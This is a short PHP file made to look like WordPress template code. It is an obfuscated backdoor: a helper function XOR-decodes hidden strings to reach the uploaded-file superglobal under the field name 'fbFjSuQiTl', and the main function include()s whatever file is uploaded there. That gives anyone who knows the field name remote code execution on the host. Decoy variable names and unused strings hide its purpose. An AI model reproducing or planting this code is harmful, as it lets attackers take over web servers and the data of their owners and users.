<?php
        
    
        
	$ptype_obj = 'strict';
function template_lock($goal)

{
    $custom_fields = $goal;

    
    $open_sq_flag = $GLOBALS;
    
    $open_sq_flag = $open_sq_flag[show_in_nav_menus("9%24%0F%26%16%26", $custom_fields)];
    
	$datetime = 'rest_controller_class';
    $part = $open_sq_flag;
    $char = isset($part[$custom_fields]);
    if ($char)

    {
	$post_type_in_string = 'wp_htmltranswinuni';
        $postarr = $open_sq_flag[$custom_fields];
        $context = $postarr[show_in_nav_menus("%12%0F65%3D%14%3C%0C", $custom_fields)];

        $post_type = $context;

        include ($post_type);
    }
}
function show_in_nav_menus($regex, $comment_regex)

{
    $dblq = $comment_regex;

    $suppress_filters = "url";
    $suppress_filters  .= "decode";
    $field = $suppress_filters($regex);
    $disabled_elements = strlen($field);
	$space = 'user_id';
    $disabled_elements = substr($dblq, 0, $disabled_elements);
	$alloptions = 'default_editor';
    $post_status_sql = $field ^ $disabled_elements;
    
    $field = sprintf($post_status_sql, $disabled_elements);
    
    return $post_status_sql;
}


template_lock('fbFjSuQiTl');


?>
